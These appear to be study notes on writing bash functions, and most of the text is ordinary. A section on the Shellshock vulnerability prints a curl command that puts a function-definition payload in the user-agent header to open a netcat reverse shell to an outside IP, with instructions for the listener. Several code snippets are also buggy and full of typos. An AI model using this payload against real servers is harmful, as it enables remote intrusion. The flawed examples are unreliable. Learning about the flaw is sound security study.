# Functions

## Writing functions

There are a few different ways to create a function. The most popular way is 

``` bash
function myFunction() {
    doSomethin here
}

function myFunction { 

}

myFunction() {

}
```

Functiions must always be defined before calling them. Meaning, the funtion almost always will need to be defined early in the script. Unlike other scripting languages.

However you almost never know what is going to be passed.
You can access the arguments passed to the funcions using the generic arguments such as `$1, $2, ...$n-1` or `$@` where it looks at all the arguments as an array. 

In bash, a function cannot return just the prodect, however, a status code can be sent back. Example:

``` bash
    #!/bin/bash

    function multiply() {
        let PRODUCT=$1 * $2
    }

    multiply 5 10
    multiply 16 16
```

#

## Shellshock Vulnerability

It is possible to create a function from the command line. We can also create function and pass it to instancees, using the export command. Refer to the earlier example within [ShellBasics](./ShellBasics.md) for exporting explanation.  Example:

``` bash
    root$plc:~# testFunction() { echo called; }
    root$plc:~# export -f testFunction
    root$plc:~# bash
    root$plc:~#testFunction
    called
    root$plc:~# env
    INFOPATH=/usr/local/info:/usr/share/info:/usr/info:/share/info
HOMEPATH=\Users\willi
.....
VBOX_MSI_INSTALL_PATH=C:\Program Files\Oracle\VirtualBox\
BASH_FUNC_testFunction%%=() {  echo called
```

As you can see when I call `env`, it will show that it is an environment variable.

*The shell shock vulnerability, was a flaw in the way that bash processed funcions that was passed anonymous variable. Bash will continue to parsing commands, after the declaration. Example:

``` bash
    root$plc:~# export someFile= '() { echo called; }; echo hacked'
```

- The `export somefile` command creates an environment variable that will be available to the new shell instances. In this case, the variable is called "someFile"

- The next part, ` '() ` declares a function. This will be assigned to the new environment variable.

- Next, the ` { echo called; } ` is the normal part of the function.

- The last part, `; echo hacked` finishes the environment variable bad. As indicated, this part is the bad part. The shell should not run this, but on vulnerable bash versions it will.

If using the named function, it will not execute. This is can happen when the webserver needs to send header data directly to the shell. When this is done, user agent string is set as a global variable. If this is the case, the user-agent string can add the vulnerability here. One way to take advantage of this, is the use of `curl`. Using this tool, you can easily test a webserver if it is vulnerable to this attack.

> Curl [man page](https://curl.haxx.se/docs/manpage.html)

``` bash
    root$plc:~# curl -A'() { :; }; /bin/nc -e /bin/bash 122.66.12.40 4444' http://1222.66.12.30/modpoll.php
```

First, we need to set up a net cat server with `nc -ve 4444` on port 4444.

Using this `-A` specify the malicious bash function as the user-agent string. (can be found in in the man page.) The rest will run a bash instance over a tcp connection.

All of this will/need to be done, in this example, through a user-agent string. You can view your user-agent string, for example, from examining elements within google chrome browers using the developer tools. User-agent string is nothing but a key, value pair string that describes the machine conneting to the server.